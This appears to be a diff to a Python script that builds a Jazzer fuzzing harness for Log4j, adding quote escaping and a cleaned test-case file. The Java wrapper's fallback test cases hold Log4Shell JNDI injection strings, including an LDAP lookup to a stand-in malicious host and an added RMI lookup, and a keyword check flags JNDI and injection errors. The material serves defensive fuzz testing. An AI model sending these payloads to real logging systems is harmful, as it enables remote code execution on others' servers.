@@ -1,14 +1,12 @@
 import os
 import json
-import sys
-import random
 import re
 
-def load_test_cases():
-    """Load the generated test cases."""
-    test_case_path = "generated_tests/log4j_test_cases.json"
+def load_test_cases(filename="cleaned_test_cases.json"):
+    """Load the cleaned test cases."""
+    test_case_path = f"generated_tests/{filename}"
     if not os.path.exists(test_case_path):
-        print(f"Test cases file not found at {test_case_path}. Please run generate_test_cases.py first.")
+        print(f"Test cases file not found at {test_case_path}. Please run clean_test_cases.py first.")
         return None
 
     with open(test_case_path, 'r') as f:
@@ -35,7 +33,9 @@ def generate_jazzer_dictionary(test_cases, output_path="generated_tests/log4j_di
     with open(output_path, 'w') as f:
         for token in unique_tokens:
             if token.strip():  # Skip empty tokens
-                f.write(f'"{token}"\n')
+                # Escape any double quotes in the token
+                escaped_token = token.replace('"', '\\"')
+                f.write(f'"{escaped_token}"\n')
 
     print(f"Generated Jazzer dictionary with {len(unique_tokens)} tokens at {output_path}")
     return output_path
@@ -72,7 +72,7 @@ import java.util.Random;
 public class Log4jFuzzerWrapper {
     private static final List<String> TEST_CASES = new ArrayList<>();
     private static final Random RANDOM = new Random();
-
+    
     static {
         // Load test cases from our generated files
         try {
@@ -96,27 +96,27 @@ public class Log4jFuzzerWrapper {
                 // Add some default test cases in case our corpus isn't available
                 TEST_CASES.add("${jndi:ldap://malicious.example.com/payload}");
                 TEST_CASES.add("%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n");
-                TEST_CASES.add("{json:['test']}");
+                TEST_CASES.add("{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\"}");
             }
         } catch (IOException e) {
             System.err.println("Error loading test cases: " + e.getMessage());
         }
     }
-
+    
     public static void fuzzerTestOneInput(FuzzedDataProvider data) {
         try {
             // Randomly determine if we should use a predefined test case or generated data
             boolean usePredefined = data.consumeBoolean();
-
+            
             if (usePredefined && !TEST_CASES.isEmpty()) {
                 // Use one of our predefined test cases
                 int index = data.consumeInt(0, TEST_CASES.size() - 1);
                 String testCase = TEST_CASES.get(index);
-
+                
                 // Create a new FuzzedDataProvider with our chosen test case data
                 byte[] testCaseBytes = testCase.getBytes();
                 FuzzedDataProvider wrappedData = new FuzzedDataProvider(testCaseBytes);
-
+                
                 // Call the original fuzzer with our data
                 Log4jFuzzer.fuzzerTestOneInput(wrappedData);
             } else {
@@ -132,13 +132,13 @@ public class Log4jFuzzerWrapper {
             throw e;
         }
     }
-
+    
     private static boolean isSecurityException(Exception e) {
         // Check for security-relevant exceptions
         String message = e.getMessage() != null ? e.getMessage().toLowerCase() : "";
-        return message.contains("jndi") ||
-               message.contains("remote") ||
-               message.contains("injection") ||
+        return message.contains("jndi") || 
+               message.contains("remote") || 
+               message.contains("injection") || 
                message.contains("deserialization") ||
                e instanceof SecurityException;
     }
@@ -157,7 +157,7 @@ JAVA_TOOL_OPTIONS="-javaagent:$HOME/.m2/repository/org/jacoco/org.jacoco.agent/0
 --cp=target/classes:$(cat classpath.txt) \\
 --target_class=org.example.Log4jFuzzerWrapper \\
 '--instrumentation_includes=org.apache.logging.log4j.**' \\
--dict={dictionary_path} \\
+-dict=llm_fuzzer/generated_tests/log4j_dictionary.dict \\
 -seed=12345 \\
 -runs=10000
 """)
@@ -170,4 +170,4 @@ if __name__ == "__main__":
         wrapper_path = generate_enhanced_fuzzer_wrapper()
         print_jazzer_command(dictionary_path)
     else:
-        print("No test cases found. Please run generate_test_cases.py first.")
+        print("No test cases found. Please run clean_test_cases.py first.")
